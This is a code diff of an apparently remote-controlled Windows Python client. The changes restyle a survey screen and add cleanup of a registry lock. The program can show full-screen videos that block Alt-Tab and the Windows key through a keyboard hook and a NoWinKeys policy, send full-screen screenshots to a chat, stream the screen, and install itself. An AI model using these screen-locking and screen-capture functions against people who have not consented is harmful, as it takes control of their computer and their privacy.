@@ -882,18 +882,38 @@ def _show_message_overlay_impl(text: str, fb_mode: str, reply_prompt: str,
 
 from PIL import Image, ImageTk
 
-_chrome_proc     = None
-_kbd_hook        = None
-_video_stop      = threading.Event()
-_video_window    = None   # tkinter overlay для кнопок поверх Chrome
+# Global reference so /unbanvideo can close it
+_video_window = None
+_video_stop   = threading.Event()
+
+# ── Chrome-based video player ────────────────────────────────────────────────
+
+_chrome_proc    = None
+_kbd_hook       = None
+_video_stop     = threading.Event()
+_video_window   = None  # tkinter overlay для кнопок поверх Chrome
+
 _kbd_hook_thread = None
+
+def _clear_winkey_registry():
+    """Гарантированно снимает NoWinKeys из реестра — вызывается при старте и при выходе."""
+    try:
+        import winreg
+        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                           r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer",
+                           0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 0)
+        winreg.CloseKey(k)
+        ctypes.windll.user32.SendMessageW(0xFFFF, 0x001A, 0, "Policy")
+    except Exception:
+        pass
+
 
 def _block_alttab(enable: bool):
     """Устанавливает/снимает low-level keyboard hook через отдельный поток с message loop."""
     global _kbd_hook, _kbd_hook_thread
 
     if not enable:
-        # Посылаем WM_QUIT в поток чтобы он завершил GetMessage loop
         if _kbd_hook_thread and _kbd_hook_thread.is_alive():
             import ctypes
             ctypes.windll.user32.PostThreadMessageW(
@@ -956,6 +976,10 @@ def _block_alttab(enable: bool):
         except Exception as e:
             log.warning(f"Registry WinKey: {e}")
 
+        # Регистрируем atexit — если процесс упадёт, реестр всё равно сбросится
+        import atexit
+        atexit.register(_clear_winkey_registry)
+
         stop_evt.set()
 
         # Message loop — без него hook не работает
@@ -966,19 +990,12 @@ def _block_alttab(enable: bool):
 
         user32.UnhookWindowsHookEx(hHook)
         # Восстанавливаем Win-клавишу
-        try:
-            import winreg
-            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                               r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer",
-                               0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 0)
-            winreg.CloseKey(k)
-            user32.SendMessageW(0xFFFF, 0x001A, 0, "Policy")
-        except Exception:
-            pass
+        _clear_winkey_registry()
         log.info("Keyboard hook removed")
 
-    _kbd_hook_thread = threading.Thread(target=_hook_thread, daemon=True)
+    # daemon=False — чтобы при завершении subprocess поток успел
+    # вызвать UnhookWindowsHookEx и сбросить реестр
+    _kbd_hook_thread = threading.Thread(target=_hook_thread, daemon=False)
     _kbd_hook_thread.start()
     stop_evt.wait(timeout=2)
 
@@ -1164,9 +1181,9 @@ def _show_survey_screen(survey: list, chat_id: str, fb_mode: str,
     sw = root2.winfo_screenwidth()
     sh = root2.winfo_screenheight()
     root2.geometry(f"{sw}x{sh}+0+0")
-    root2.configure(bg="#071a0f")
+    root2.configure(bg="#0d0d0d")
 
-    canvas = tk.Canvas(root2, bg="#071a0f", highlightthickness=0)
+    canvas = tk.Canvas(root2, bg="#0d0d0d", highlightthickness=0)
     canvas.place(relwidth=1, relheight=1)
 
     answers  = []
@@ -1179,11 +1196,10 @@ def _show_survey_screen(survey: list, chat_id: str, fb_mode: str,
     cx = (sw - card_w) // 2
     cy = (sh - card_h) // 2
 
-    card_bg = "#0d2b18"
-    accent  = "#00FA9A"
-    accent2 = "#3CB371"
-    txt_col = "#e8fff3"
-    sub_col = "#5da87a"
+    card_bg = "#1a1a2e"
+    accent  = "#4f46e5"
+    txt_col = "#f0f0f0"
+    sub_col = "#888"
 
     # Рисуем скруглённый прямоугольник через polygon
     def rounded_rect(cv, x, y, w, h, r, **kw):
@@ -1201,11 +1217,7 @@ def _show_survey_screen(survey: list, chat_id: str, fb_mode: str,
     shadow = rounded_rect(canvas, cx+6, cy+6, card_w, card_h, 28,
                           fill="#000000", outline="")
     card   = rounded_rect(canvas, cx, cy, card_w, card_h, 28,
-                          fill=card_bg, outline="#1a4d30", width=2)
-
-    # Акцентная полоса сверху
-    canvas.create_rectangle(cx+28, cy, cx+card_w-28, cy+3,
-                            fill=accent, outline="")
+                          fill=card_bg, outline="#2a2a4a", width=2)
 
     # Прогресс-бар
     bar_y  = cy + card_h - 12
@@ -1240,17 +1252,17 @@ def _show_survey_screen(survey: list, chat_id: str, fb_mode: str,
     entry_frame = tk.Frame(root2, bg=card_bg, bd=0)
     entry_frame.place(x=cx+28, y=cy+180, width=card_w-56, height=48)
 
-    entry_inner = tk.Frame(entry_frame, bg="#0a2416", bd=0)
+    entry_inner = tk.Frame(entry_frame, bg="#252540", bd=0)
     entry_inner.pack(fill="both", expand=True)
 
     entry = tk.Entry(entry_inner,
                      font=("Segoe UI", 14),
-                     bg="#0a2416", fg=txt_col,
+                     bg="#252540", fg=txt_col,
                      insertbackground=accent,
                      relief="flat", bd=10,
                      highlightthickness=2,
                      highlightcolor=accent,
-                     highlightbackground="#1a4d30")
+                     highlightbackground="#333360")
     entry.pack(fill="both", expand=True)
     entry.focus_force()
 
@@ -1265,8 +1277,8 @@ def _show_survey_screen(survey: list, chat_id: str, fb_mode: str,
             angle  = random.uniform(0, 2 * math.pi)
             speed  = random.uniform(4, 14)
             size   = random.randint(4, 10)
-            color  = _rnd2.choice(["#00FA9A", "#3CB371", "#2E8B57",
-                                    "#00FF7F", "#ffffff", "#b0e8cc"])
+            color  = _rnd2.choice(["#4f46e5", "#7c3aed", "#a78bfa",
+                                    "#e879f9", "#ffffff", "#c4b5fd"])
             vx = math.cos(angle) * speed
             vy = math.sin(angle) * speed
             pid = canvas.create_oval(bx-size//2, by-size//2,
@@ -1295,8 +1307,8 @@ def _show_survey_screen(survey: list, chat_id: str, fb_mode: str,
     def do_send():
         answer = entry.get().strip()
         if not answer:
-            entry.config(highlightbackground="#ff4444", highlightcolor="#ff4444")
-            root2.after(600, lambda: entry.config(highlightbackground="#1a4d30"))
+            entry.config(highlightbackground=accent, highlightcolor=accent)
+            root2.after(600, lambda: entry.config(highlightbackground="#333360"))
             return
 
         # Взрыв в центре кнопки
@@ -1334,9 +1346,9 @@ def _show_survey_screen(survey: list, chat_id: str, fb_mode: str,
     send_btn = tk.Button(send_frame,
                          text="Отправить →",
                          font=("Segoe UI", 13, "bold"),
-                         bg=accent2, fg="#071a0f",
-                         activebackground=accent,
-                         activeforeground="#071a0f",
+                         bg=accent, fg="white",
+                         activebackground="#7c3aed",
+                         activeforeground="white",
                          relief="flat", bd=0,
                          cursor="hand2",
                          command=do_send)
@@ -1361,16 +1373,11 @@ def _show_survey_screen(survey: list, chat_id: str, fb_mode: str,
 
 def show_video_overlay(video_path: str, lock: bool, duration: int,
                         fb_mode: str, reply_prompt: str, survey: list,
-                        chat_id: str, minimize: bool = False):
+                        chat_id: str):
     global _chrome_proc, _video_stop, _video_window
 
     _video_stop = threading.Event()
     stop_event  = _video_stop
-
-    if minimize:
-        minimize_all()
-        time.sleep(0.3)
-        _run_glitch_then_show(lambda: None)  # glitch без overlay — только эффект
 
     video_path = os.path.abspath(video_path)
     video_dir  = os.path.dirname(video_path)
@@ -1454,8 +1461,6 @@ def show_video_overlay(video_path: str, lock: bool, duration: int,
 
     if lock:
         _block_alttab(True)
-
-    _needs_survey = [False]  # флаг: открыть survey после mainloop
 
     # ── Overlay: нижняя панель в зелёном стиле ────────────────────────────────
     PANEL_H  = 80
@@ -1576,11 +1581,10 @@ def show_video_overlay(video_path: str, lock: bool, duration: int,
         _kill_chrome()
         global _video_window
         _video_window = None
-        # Ставим флаг ДО destroy — после mainloop() вызовем survey
-        if fb_mode in ("survey", "reply") and (survey or fb_mode == "reply"):
-            _needs_survey[0] = True
         try: root.destroy()
         except Exception: pass
+        if fb_mode in ("survey", "reply") and (survey or fb_mode == "reply"):
+            _show_survey_screen(survey, chat_id, fb_mode, reply_prompt)
 
     close_btn.bind("<Button-1>", lambda e: do_close_and_survey())
 
@@ -1631,11 +1635,6 @@ def show_video_overlay(video_path: str, lock: bool, duration: int,
 
     root.mainloop()
 
-    # mainloop вернул управление — root уже уничтожен.
-    # Теперь безопасно открыть новое окно survey/reply.
-    if _needs_survey[0]:
-        _show_survey_screen(survey, chat_id, fb_mode, reply_prompt)
-
 
 def unban_video():
     global _video_window
@@ -1681,7 +1680,6 @@ def open_file_picker(chat_id: str):
 def take_screenshot(chat_id: str):
     """Делает скриншот всего экрана и отправляет в чат."""
     import tempfile
-    tmp_path = None
     try:
         from PIL import ImageGrab
         img = ImageGrab.grab()
@@ -1701,11 +1699,10 @@ def take_screenshot(chat_id: str):
         except Exception:
             pass
     finally:
-        if tmp_path:
-            try:
-                os.unlink(tmp_path)
-            except Exception:
-                pass
+        try:
+            os.unlink(tmp_path)
+        except Exception:
+            pass
 
 # ─── WiFi Screen Streaming (MJPEG, аналог Android ScreenStreamService) ────────
 #
@@ -2677,7 +2674,7 @@ def handle_command(cmd: dict):
         if not os.path.exists(path):
             log.warning(f"Built-in video not found: {path}")
             return
-        ui_call("show_video_overlay", path, lock, duration, fb_mode, rp, survey, chat_id, minimize)
+        ui_call("show_video_overlay", path, lock, duration, fb_mode, rp, survey, chat_id)
 
     elif name == "play_raw":
         raw_num = cmd.get("raw_num", 0)
@@ -2693,7 +2690,7 @@ def handle_command(cmd: dict):
         else:
             path = videos[raw_num - 1]["path"]
             ui_call("show_video_overlay", path, lock, duration,
-                    fb_mode, rp, survey, chat_id, minimize)
+                    fb_mode, rp, survey, chat_id)
 
     elif name == "prefetch":
         url = cmd.get("url", "")
@@ -3058,4 +3055,6 @@ if __name__ == "__main__":
         self_install()
     else:
         print_uninstall_hint()
+        # Сбрасываем NoWinKeys на случай если прошлый сеанс упал не сняв блокировку
+        _clear_winkey_registry()
         _poll_loop_supervisor()
